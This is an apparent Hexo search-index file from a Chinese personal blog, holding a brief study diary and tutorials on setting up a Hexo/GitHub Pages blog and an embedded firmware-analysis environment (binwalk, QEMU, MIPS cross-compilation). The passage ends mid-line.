<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Emiyaのdiary</title>
    <url>/2099/06/16/Emiya%E3%81%AEdiary/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="20220502-20220508"><a href="#20220502-20220508" class="headerlink" title="20220502 - 20220508"></a>20220502 - 20220508</h3><ol>
<li><p>学习利用Hexo和github搭建博客，目前博客基本搭建完成</p>
</li>
<li><p>搭建嵌入式环境，基本完成</p>
</li>
<li><p>学习修复路由器运行环境</p>
</li>
<li><p>学习 kernel pwn 基础环境搭建知识</p>
</li>
</ol>
<h3 id="20220509-20220515"><a href="#20220509-20220515" class="headerlink" title="20220509 - 20220515"></a>20220509 - 20220515</h3><ol>
<li><p>学习 0CTF-2021-kernote， 主要思想是利用 ldt_struct 结构</p>
</li>
<li><p>学习 Linux Kernel Pwn UAF ROP ret2usr Bypass-smep</p>
</li>
<li><p>学习 Linux kernel 的启动与初始化流程</p>
</li>
</ol>
<h3 id="20220516-20220522"><a href="#20220516-20220522" class="headerlink" title="20220516 - 20220522"></a>20220516 - 20220522</h3>]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
  </entry>
  <entry>
    <title>个人博客搭建记录[1]</title>
    <url>/2022/05/02/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95-1/</url>
    <content><![CDATA[<span id="more"></span>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OS Type: macOS</span><br><span class="line">OS Version: 10.15</span><br><span class="line">git 2.30.0</span><br><span class="line">node v16.11.0</span><br><span class="line">npm 8.0.0</span><br></pre></td></tr></table></figure>

<h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><p><strong>安装 hexo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line">$ hexo --version</span><br><span class="line">hexo-cli: 4.3.0</span><br><span class="line">os: darwin 19.6.0 10.15.7</span><br><span class="line"></span><br><span class="line">node: 16.11.0</span><br><span class="line">v8: 9.4.146.19-node.13</span><br><span class="line">uv: 1.42.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.9</span><br><span class="line">ares: 1.17.2</span><br><span class="line">modules: 93</span><br><span class="line">nghttp2: 1.45.1</span><br><span class="line">napi: 8</span><br><span class="line">llhttp: 6.0.2</span><br><span class="line">openssl: 1.1.1l</span><br><span class="line">cldr: 39.0</span><br><span class="line">icu: 69.1</span><br><span class="line">tz: 2021a</span><br><span class="line">unicode: 13.0</span><br></pre></td></tr></table></figure>

<p><strong>初始化 hexo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt; </span><br><span class="line">INFO  Cloning hexo-starter https://github.com/hexojs/hexo-starter.git</span><br><span class="line">INFO  Install dependencies</span><br><span class="line">INFO  Start blogging with Hexo!</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── _config.landscape.yml </span><br><span class="line">├── _config.yml <span class="comment"># 网站的配置信息</span></span><br><span class="line">├── node_modules</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json <span class="comment"># 应用程序的信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 模版文件夹 - 新建文章文件中默认添加的内容</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 存放用户资源的地方</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹 - 用来生成静态页面</span></span><br></pre></td></tr></table></figure>

<p><strong>配置远程仓库</strong><br>创建 git 仓库，仓库名为 <name>.github.io</p>
<p>在本地设置 git 配置，并将 ssh 公钥配置到 github</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&#x27;&lt;gitname&gt;&#x27;</span></span><br><span class="line">$ git config --global user.email <span class="string">&#x27;&lt;gitemail&gt;&#x27;</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;&lt;gitemail&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<p>查看 ssh 是否设置成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh git@github.com</span><br><span class="line">PTY allocation request failed on channel 0</span><br><span class="line">Hi Yourname! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="string">Connection to github.com closed.</span></span><br></pre></td></tr></table></figure>

<p><strong>网站信息配置</strong><br>通过 <code>_config.yml</code> 修改配置</p>
<p>此处主要设置 <code>deploy</code>：即给 <code>hexo d</code> 进行配置告知 <code>hexo</code> 将 blog 部署在哪里</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  <span class="attr">repository:</span>  <span class="string">https://github.com/Yourname/Yourname.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>安装部署插件，并部署</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">$ hexo clean <span class="comment"># 清除缓存</span></span><br><span class="line">$ hexo g <span class="comment"># 生成静态文件</span></span><br><span class="line">$ hexo d <span class="comment"># 部署网站</span></span><br><span class="line">....</span><br><span class="line">To https://github.com/Yourname/Yourname.github.io.git</span><br><span class="line"> * [new branch]      HEAD -&gt; master</span><br><span class="line">分支 <span class="string">&#x27;master&#x27;</span> 设置为跟踪来自 <span class="string">&#x27;https://github.com/Yourname/Yourname.github.io.git&#x27;</span> 的远程分支 <span class="string">&#x27;master&#x27;</span>。</span><br><span class="line">INFO  Deploy <span class="keyword">done</span>: git</span><br></pre></td></tr></table></figure>

<p><strong>绑定域名</strong><br>绑定域名需要三步</p>
<ol>
<li><p>在域名服务商修改解析记录集<br>我使用的华为云，设置 A 和 CNAME 记录如下图<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205021542680.png"><br>A 记录可以通过站长工具进行查询 <name>.github.io 的 ip 地址<br>注意：不能对同一个域名同时设置 A 记录和 CNAME 记录，会造成冲突</p>
</li>
<li><p>在 github 修改提供服务的域名<br>在 <name>.github.io 仓库中进行设置域名，<code>Settings-&gt;Pages-&gt;Custom domain</code>, 设置为自己的域名</p>
</li>
<li><p>在本地博客添加记录集文件 CNAME</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">emiyada.cn</span><br></pre></td></tr></table></figure></li>
</ol>
<p>重新部署</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
<p>从浏览器打开页面可以看到<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205021540840.png"></p>
<h3 id="报错解决方式"><a href="#报错解决方式" class="headerlink" title="报错解决方式"></a>报错解决方式</h3><ol>
<li><p>无法读取远程仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fatal: <span class="string">&#x27;git@github.com/Yourname/Yourname.github.io.git&#x27;</span> does not appear to be a git repository</span><br><span class="line">fatal: 无法读取远程仓库。</span><br></pre></td></tr></table></figure>
<p>这里可能是由于将 deploy repo 设置成 git@ 连接方式，建议改成 https 连接</p>
</li>
<li><p>鉴权失败</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ <span class="keyword">for</span> more information.</span><br><span class="line">fatal: <span class="string">&#x27;https://github.com/Yourname/Yourname.github.io.git/&#x27;</span> 鉴权失败</span><br></pre></td></tr></table></figure>
<p>在部署的时候会提示输入用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username for &#x27;https://github.com&#x27;:</span><br><span class="line">Password for &#x27;https://Yourname@github.com&#x27;:</span><br></pre></td></tr></table></figure>
<p>这里如果输入正常的github密码会报错鉴权失败，因为在2020年之后github修改成 token 认证机制</p>
</li>
</ol>
<p>token 可以通过 github 的 <code>Settings-&gt;Developer settings-&gt;Personal access tokens</code> 生成，并将其作为密码</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>blog搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>个人博客搭建记录[2]</title>
    <url>/2022/05/02/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95-2/</url>
    <content><![CDATA[<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OS Platform: macOS</span><br><span class="line">OS Version: 10.15</span><br></pre></td></tr></table></figure>

<h3 id="个性化配置"><a href="#个性化配置" class="headerlink" title="个性化配置"></a>个性化配置</h3><p><strong>更换主题</strong><br>主题是博客页面的展示方式，不喜欢当前主题可以进行更换</p>
<p>hexo 主题页面：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a><br>本文采用 <a href="https://github.com/theme-next/hexo-theme-next">Next</a> 主题</p>
<p>下载 thems 到博客文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p>修改站点的配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
<p>打开主题的配置文件进行 Scheme Settings</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Scheme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br></pre></td></tr></table></figure>
<p>重新编译并部署即可</p>
<p><strong>修改目录</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br></pre></td></tr></table></figure>

<p><strong>更换头像</strong><br>选择自己喜欢的图片加进去即可</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpeg</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>添加社交网络</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/darenfy</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:darenfy@gmail.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br></pre></td></tr></table></figure>
<p><strong>增加阅读全文功能</strong></p>
<p><strong>开启文章目录</strong></p>
<h3 id="Hexo-使用"><a href="#Hexo-使用" class="headerlink" title="Hexo 使用"></a>Hexo 使用</h3><h4 id="如何写文章"><a href="#如何写文章" class="headerlink" title="如何写文章"></a>如何写文章</h4><p>命令行输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&#x27;blog name&#x27;</span></span><br></pre></td></tr></table></figure>
<p>就能看到在 <code>source</code> 文件夹下新建了 <code>blog name.md</code> 文件，</p>
<h4 id="搭建图床"><a href="#搭建图床" class="headerlink" title="搭建图床"></a>搭建图床</h4><p>使用 picGo 在 github 上构建免费图床，具体设置请参考 <a href="https://picgo.github.io/PicGo-Doc/zh/guide/">https://picgo.github.io/PicGo-Doc/zh/guide/</a></p>
<h3 id="Hexo-备份"><a href="#Hexo-备份" class="headerlink" title="Hexo 备份"></a>Hexo 备份</h3><p><a href="http://www.xiaoliblog.cn/page/hexobackup.html#%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6">hexo-git-backup 博客备份及恢复</a><br><a href="https://github.com/coneycode/hexo-git-backup">git-backup</a></p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol>
<li>在进行个性化配置的过程中，如果想要实时查看配置效果，直接采用本地 <code>hexo s</code></li>
</ol>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.mdnice.com/writing/382af676baff4ed4ad5511074fb736da">https://www.mdnice.com/writing/382af676baff4ed4ad5511074fb736da</a></p>
<p><a href="https://blog.51cto.com/u_12877374/2853898">Hexo博客NexT主题开启文章目录和调整样式</a></p>
<p><a href="http://theme-next.iissnan.com/theme-settings.html">主题配置</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/460818216">hexo博客新增RSS功能支持</a></p>
<p><a href="https://tding.top/archives/42c38b10.html">Hexo-NexT (v7.0+) 主题配置</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>blog搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式环境搭建</title>
    <url>/2022/05/03/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h2 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改为中科大源</span></span><br><span class="line"></span><br><span class="line">$ sudo apt install build-essential autoconf <span class="comment"># 配置</span></span><br><span class="line">$ sudo apt install tree jnettop htop <span class="comment"># 查看目录、连接、性能</span></span><br><span class="line">$ sudo apt install proxychains4 net-tools <span class="comment"># 查看配置网络</span></span><br><span class="line">$ sudo apt install git curl wget  <span class="comment"># 下载</span></span><br><span class="line"></span><br><span class="line">$ sudo apt install python3 python3-pip <span class="comment"># python3 环境</span></span><br><span class="line">$ python3 -m pip install --upgrade pip</span><br><span class="line">$ python3 -m pip -V</span><br><span class="line">pip 21.3.1 from /home/embeded/.local/lib/python3.6/site-packages/pip (python 3.6)</span><br></pre></td></tr></table></figure>

<h1 id="软件环境搭建流程"><a href="#软件环境搭建流程" class="headerlink" title="软件环境搭建流程"></a>软件环境搭建流程</h1><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Binwalk wiki 链接：<a href="https://github.com/ReFirmLabs/binwalk/wiki">https://github.com/ReFirmLabs/binwalk/wiki</a></p>
<p>安装参考链接：<a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line">$ <span class="built_in">cd</span> binwalk</span><br><span class="line">$ sudo python3 setup.py install</span><br><span class="line">...</span><br><span class="line">Installed /usr/local/lib/python3.6/dist-packages/binwalk-2.3.3-py3.6.egg</span><br><span class="line">Processing dependencies <span class="keyword">for</span> binwalk==2.3.3</span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> binwalk==2.3.3</span><br><span class="line"></span><br><span class="line">$ binwalk </span><br><span class="line"></span><br><span class="line">Binwalk v2.3.3</span><br><span class="line">Craig Heffner, ReFirmLabs</span><br><span class="line">https://github.com/ReFirmLabs/binwalk</span><br><span class="line"></span><br><span class="line">Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>依据 Binwalk wiki 所说，其安装依赖只有 python 解释器，其余所有依赖都是可选的运行时依赖，直接按顺序全部安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo python3 -m pip install nose coverage <span class="comment"># 测试/测试覆盖率</span></span><br><span class="line"></span><br><span class="line">$ sudo python3 -m pip install pycryptodome <span class="comment"># 解密知名加密固件</span></span><br><span class="line"></span><br><span class="line">$ sudo apt-get install libqt4-opengl python3-opengl python3-pyqt4 python3-pyqt4.qtopengl python3-numpy python3-scipy</span><br><span class="line">$ sudo python3 -m pip install pyqtgraph <span class="comment"># 生成图及可视化</span></span><br><span class="line"></span><br><span class="line">$ sudo python3 -m pip install capstone <span class="comment"># 反汇编框架 Python-bindings</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 额外的工具自动抽取/解压文件和数据  </span></span><br><span class="line"><span class="comment"># 标准解压工具</span></span><br><span class="line">$ sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对非标准 SquashFS 镜像</span></span><br><span class="line">$ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch</span><br><span class="line">$ (<span class="built_in">cd</span> sasquatch &amp;&amp; ./build.sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对 JFFS2 文件系统</span></span><br><span class="line">$ sudo python3 -m pip install cstruct</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/sviehb/jefferson</span><br><span class="line">$ (<span class="built_in">cd</span> jefferson &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对 UBIFS 文件系统</span></span><br><span class="line">$ sudo apt-get install liblzo2-dev python-lzo</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/jrspruitt/ubi_reader</span><br><span class="line">$ (<span class="built_in">cd</span> ubi_reader &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对 YAFFS 文件系统</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/devttys0/yaffshiv</span><br><span class="line">$ (<span class="built_in">cd</span> yaffshiv &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对 StuffIt 压缩文件</span></span><br><span class="line">$ wget -O - http://downloads.tuxfamily.org/sdtraces/stuffit520.611linux-i386.tar.gz | tar -zxv</span><br><span class="line">$ sudo <span class="built_in">cp</span> bin/unstuff /usr/local/bin/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h3><p>:exclamation: 按照原文安装过程中会报错 <code>E: Unable to locate package cramfsprogs</code> 需要手动安装这个包<br>安装包都可以从 <a href="https://launchpad.net/ubuntu">https://launchpad.net/ubuntu</a> 查找</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget -c https://launchpad.net/ubuntu/+archive/primary/+files/cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br><span class="line">$ sudo dpkg -i cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br></pre></td></tr></table></figure>

<p>【optional】 binwalk plugin for ida in linux</p>
<p>至此 binwalk 算是安装好了，至于使用放在后话吧</p>
<h2 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>qemu github 项目地址：<a href="https://github.com/qemu/qemu">https://github.com/qemu/qemu</a></p>
<p>qemu 官网：<a href="https://www.qemu.org/">https://www.qemu.org/</a></p>
<p>参考网站提供的安装方式，目前直接使用 <code>apt</code> 安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install qemu</span><br><span class="line">Suggested packages:</span><br><span class="line">  qemu-user-static samba vde2 qemu-efi openbios-ppc openhackware</span><br><span class="line">  openbios-sparc sgabios ovmf debootstrap sharutils-doc bsd-mailx | mailx</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  binfmt-support cpu-checker ibverbs-providers ipxe-qemu</span><br><span class="line">  ipxe-qemu-256k-compat-efi-roms libaio1 libcacard0 libfdt1 libibverbs1</span><br><span class="line">  libiscsi7 libnl-route-3-200 librados2 librbd1 librdmacm1 libsdl1.2debian</span><br><span class="line">  libspice-server1 libusbredirparser1 libxen-4.9 libxenstore3.0 msr-tools qemu</span><br><span class="line">  qemu-block-extra qemu-slof qemu-system qemu-system-arm qemu-system-common</span><br><span class="line">  qemu-system-mips qemu-system-misc qemu-system-ppc qemu-system-s390x</span><br><span class="line">  qemu-system-sparc qemu-system-x86 qemu-user qemu-user-binfmt qemu-utils</span><br><span class="line">  seabios sharutils</span><br><span class="line"><span class="comment"># 可以看到 qemu-utils qemu-user qemu-system 都自动安装成功</span></span><br><span class="line">$ qemu-</span><br><span class="line">qemu-aarch64              qemu-ppc                  qemu-system-mipsel</span><br><span class="line">qemu-alpha                qemu-ppc64                qemu-system-moxie</span><br><span class="line">qemu-arm                  qemu-ppc64abi32           qemu-system-nios2</span><br><span class="line">qemu-armeb                qemu-ppc64le              qemu-system-or1k</span><br><span class="line">qemu-cris                 qemu-s390x                qemu-system-ppc</span><br><span class="line">qemu-hppa                 qemu-sh4                  qemu-system-ppc64</span><br><span class="line">qemu-i386                 qemu-sh4eb                qemu-system-ppc64le</span><br><span class="line">qemu-img                  qemu-sparc                qemu-system-ppcemb</span><br><span class="line">qemu-io                   qemu-sparc32plus          qemu-system-s390x</span><br><span class="line">qemu-m68k                 qemu-sparc64              qemu-system-sh4</span><br><span class="line">qemu-make-debian-root     qemu-system-aarch64       qemu-system-sh4eb</span><br><span class="line">qemu-microblaze           qemu-system-alpha         qemu-system-sparc</span><br><span class="line">qemu-microblazeel         qemu-system-arm           qemu-system-sparc64</span><br><span class="line">qemu-mips                 qemu-system-cris          qemu-system-tricore</span><br><span class="line">qemu-mips64               qemu-system-i386          qemu-system-unicore32</span><br><span class="line">qemu-mips64el             qemu-system-lm32          qemu-system-x86_64</span><br><span class="line">qemu-mipsel               qemu-system-m68k          qemu-system-xtensa</span><br><span class="line">qemu-mipsn32              qemu-system-microblaze    qemu-system-xtensaeb</span><br><span class="line">qemu-mipsn32el            qemu-system-microblazeel  qemu-tilegx</span><br><span class="line">qemu-nbd                  qemu-system-mips          qemu-x86_64</span><br><span class="line">qemu-nios2                qemu-system-mips64        </span><br><span class="line">qemu-or1k                 qemu-system-mips64el </span><br><span class="line"></span><br><span class="line"><span class="comment"># 依据建议的安装包手动安装</span></span><br><span class="line">$ sudo apt install qemu-user-static</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>交叉编译这个名字其实有时候很费解，还不如直接<strong>跨架构编译</strong>，即能够在一个体系架构下编译另一个体系架构的程序<br>🌰 在 X86_64 Ubuntu 虚拟机下能够编译 MIPS 程序</p>
<p>🧐 安装似乎可以分成 <strong>手动 buildroot 源码编译</strong> 和 <strong>自动 apt 安装</strong><br><strong>自动安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以 MIPS 小端序 架构为例 自动安装</span></span><br><span class="line">$ sudo apt install gcc-mipsel-linux-gnu </span><br><span class="line">$ sudo apt install gcc-multilib-mipsel-linux-gnu</span><br><span class="line">$ mipsel-linux-gnu-</span><br><span class="line">mipsel-linux-gnu-addr2line     mipsel-linux-gnu-gcov-7</span><br><span class="line">mipsel-linux-gnu-ar            mipsel-linux-gnu-gcov-dump</span><br><span class="line">mipsel-linux-gnu-as            mipsel-linux-gnu-gcov-dump-7</span><br><span class="line">mipsel-linux-gnu-c++filt       mipsel-linux-gnu-gcov-tool</span><br><span class="line">mipsel-linux-gnu-cpp           mipsel-linux-gnu-gcov-tool-7</span><br><span class="line">mipsel-linux-gnu-cpp-7         mipsel-linux-gnu-gprof</span><br><span class="line">mipsel-linux-gnu-dwp           mipsel-linux-gnu-ld</span><br><span class="line">mipsel-linux-gnu-elfedit       mipsel-linux-gnu-ld.bfd</span><br><span class="line">mipsel-linux-gnu-gcc           mipsel-linux-gnu-ld.gold</span><br><span class="line">mipsel-linux-gnu-gcc-7         mipsel-linux-gnu-nm</span><br><span class="line">mipsel-linux-gnu-gcc-ar        mipsel-linux-gnu-objcopy</span><br><span class="line">mipsel-linux-gnu-gcc-ar-7      mipsel-linux-gnu-objdump</span><br><span class="line">mipsel-linux-gnu-gcc-nm        mipsel-linux-gnu-ranlib</span><br><span class="line">mipsel-linux-gnu-gcc-nm-7      mipsel-linux-gnu-readelf</span><br><span class="line">mipsel-linux-gnu-gcc-ranlib    mipsel-linux-gnu-size</span><br><span class="line">mipsel-linux-gnu-gcc-ranlib-7  mipsel-linux-gnu-strings</span><br><span class="line">mipsel-linux-gnu-gcov          mipsel-linux-gnu-strip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有的库都安装好</span></span><br><span class="line">$ <span class="built_in">ls</span> /usr/mipsel-linux-gnu/</span><br><span class="line">bin  include  lib  lib32  lib64</span><br></pre></td></tr></table></figure>

<h3 id="出现的问题-1"><a href="#出现的问题-1" class="headerlink" title="出现的问题"></a>出现的问题</h3><p><strong>自动安装</strong><br>在运行动态编译程序时，会出现无法找到运行库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hellomips2</span><br><span class="line">hellomips2: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=102923f6f07c0954cdcec2091a8e65988d646527, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel-static hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜测是动态编译的程序默认去 /lib 下进行寻找动态链接库</span></span><br><span class="line"><span class="comment"># 两种解决办法</span></span><br><span class="line"><span class="comment"># 1. 将动态链接库直接复制到 /lib 下，执行命令行执行模拟，【感觉环境会被搞乱</span></span><br><span class="line">embeded@ubuntu:/usr/mipsel-linux-gnu/lib$ sudo <span class="built_in">cp</span> ld.so.1 /lib</span><br><span class="line">embeded@ubuntu:/usr/mipsel-linux-gnu/lib$ <span class="built_in">ls</span> /lib</span><br><span class="line">apparmor       hdparm                                lsb            terminfo</span><br><span class="line">brltty         ifupdown                              modprobe.d     udev</span><br><span class="line">console-setup  init                                  modules        ufw</span><br><span class="line">cpp            klibc-IYXwqr0atR70aQDgNUuRThfwUwA.so  netplan        x86_64-linux-gnu</span><br><span class="line">crda           ld.so.1                               recovery-mode</span><br><span class="line">firmware       linux-sound-base                      systemd</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel-static hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 将动态库和静态编译模拟程序qemu-mipsel-static复制到需要模拟的程序所在目录下，执行模拟 【感觉比第一种选择好</span></span><br><span 